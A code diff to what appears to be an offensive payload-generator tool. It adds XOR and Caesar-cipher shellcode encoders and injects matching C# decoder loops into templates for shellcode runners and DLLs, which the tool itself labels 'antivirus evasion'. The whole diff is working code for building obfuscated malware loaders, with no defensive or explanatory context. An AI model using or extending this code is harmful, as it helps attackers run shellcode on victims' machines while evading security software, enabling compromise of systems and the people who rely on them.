@@ -12,7 +12,7 @@ def read_file(f):
             content = fs.read()
         return content
 
-def shellcodeEncoder(shellcode):
+def shellcodeEncoder(technique, shellcode):
     # Python shellcode encoder 
     shellcode = "".join(shellcode.splitlines())
     #print(shellcode)
@@ -23,17 +23,51 @@ def shellcodeEncoder(shellcode):
     shellcode_chars = shellcode.split(",") 
     shellcode_chars = list(filter(None, shellcode_chars))
 
-    encoded_shellcode_chars = []
+    # cesar cipher encoder
+    cesar_encoded_shellcode_chars = []
     for c in shellcode_chars:
-        encoded_shellcode_chars.append("0x{:02x}".format(int(c,16)+2 & 0xFF))
+        cesar_encoded_shellcode_chars.append("0x{:02x}".format(int(c,16)+2 & 0xFF))
+
+    # xor encoder
+    xor_encoded_shellcode_chars = []
+    for c in shellcode_chars:
+        xor_encoded_shellcode_chars.append("0x{:02x}".format(int(c,16)^0xfa & 0xFF))
+
+    if (technique == "xor"):
+        result = xor_encoded_shellcode_chars
+    elif (technique == "cesar"):
+        result = cesar_encoded_shellcode_chars
+    #print(f"XOR shellcode: {xor_encoded_shellcode_chars}")
     
-    return (shellcode_start + " {"+ ",".join(encoded_shellcode_chars) + "};")
+    return (shellcode_start + " {"+ ",".join(result) + "};")
 
 
-def generateCPayload(shellcode, arch):
+def shellcodeDecoder(technique):
+    if (technique == "xor"):
+        text = """
+            //XOR decoder
+            for(int i = 0; i < buf.Length; i++)
+            {
+                buf[i] = (byte)(((uint)buf[i] ^ 0xfa) & 0xFF);
+            }
+"""
+    elif (technique == "cesar"):
+        text = """
+            //Cesar decoder
+            for(int i = 0; i < buf.Length; i++)
+            {
+                buf[i] = (byte)(((uint)buf[i] - 2) & 0xFF);
+            }
+"""
+    return text
+
+
+
+def generateCPayload(technique, shellcode, arch):
     '''Generating C# payload with antivirus evasion'''
 
     print(colored("[+] Generating C# exploit", 'green'))
+    print(colored(f"    [+] {technique} Encrypting shelcode", 'white'))
 
     # Encoder template
     template_name = "cs_encryptor.cs"
@@ -45,31 +79,37 @@ def generateCPayload(shellcode, arch):
     f.close()
 
     # Python shellcode encoder  
-    encoded_shellcode = shellcodeEncoder(shellcode)
+    encoded_shellcode = shellcodeEncoder(technique, shellcode)
+    shellcode_decoder = shellcodeDecoder(technique)
 
+    #print(f"Decoder: {shellcodeDecoder("xor", encoded_shellcode)}")
 
     # C# shellcode runner
     template_name = "cs_antivirus_evasion.cs"
     template = read_file("templates/" + template_name)
     template_out = template.replace("%ENCSHELLCODE%", encoded_shellcode)
+    template_out = template_out.replace("%DECODER%", shellcode_decoder)
     
     f = open(f"output/{arch}/" + template_name, 'w')
     f.write(template_out)
     f.close()
 
-def generateCDllPayload(shellcode, arch):
+def generateCDllPayload(technique, shellcode, arch):
     # C# DLL shellcode 
     # Python shellcode encoder  
-    encoded_shellcode = shellcodeEncoder(shellcode)
+    print(colored("[+] Generating C# DLL exploit", 'green'))
+    print(colored(f"    [+] {technique} Encrypting shelcode", 'white'))
+
+    encoded_shellcode = shellcodeEncoder(technique, shellcode)
+    shellcode_decoder = shellcodeDecoder(technique)
 
     template_name = "cs_dll.cs"
     template = read_file("templates/" + template_name)
     template_out = template.replace("%ENCSHELLCODE%", encoded_shellcode)
+    template_out = template_out.replace("%DECODER%", shellcode_decoder)
     
     f = open(f"output/{arch}/" + template_name, 'w')
     f.write(template_out)
     f.close()
-
-   
 
     
